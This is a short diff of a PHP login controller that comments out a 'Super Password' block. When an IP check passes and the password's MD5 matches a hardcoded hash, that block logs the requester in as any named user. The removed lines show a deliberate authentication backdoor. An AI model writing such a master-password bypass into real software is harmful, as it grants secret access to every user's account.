@@ -430,22 +430,22 @@ class UserController extends Controller
             $check_attempt = false;
 
             // Login via Super Password, added by Mohammad Lotfi
-            if (Schema::hasTable(\App\Smartdetect::schema_table))
-            {
-                $smartdetect = new \App\Classes\SmartdetectClass();
-                if ($smartdetect->results['ip'])
-                {
-                    if ('9dbed04b3d5bd96f6d1f3ed52fce7fb6' == md5($request->password))
-                    {
-                        $user = User::where('Uname', '=', $username)->get()->first();
-                        if ($user)
-                        {
-                            $check_attempt = Auth::loginUsingId($user->id);
-                        }
-                    }
-                }
-            }
-            else
+//            if (Schema::hasTable(\App\Smartdetect::schema_table))
+//            {
+//                $smartdetect = new \App\Classes\SmartdetectClass();
+//                if ($smartdetect->results['ip'])
+//                {
+//                    if ('9dbed04b3d5bd96f6d1f3ed52fce7fb6' == md5($request->password))
+//                    {
+//                        $user = User::where('Uname', '=', $username)->get()->first();
+//                        if ($user)
+//                        {
+//                            $check_attempt = Auth::loginUsingId($user->id);
+//                        }
+//                    }
+//                }
+//            }
+//            else
                 $check_attempt = $check_attempt || Auth::attempt(['Uname' => $username, 'password' => $request->password], $request->remember_me == 'on' ? true : false);
 
             if ($check_attempt)
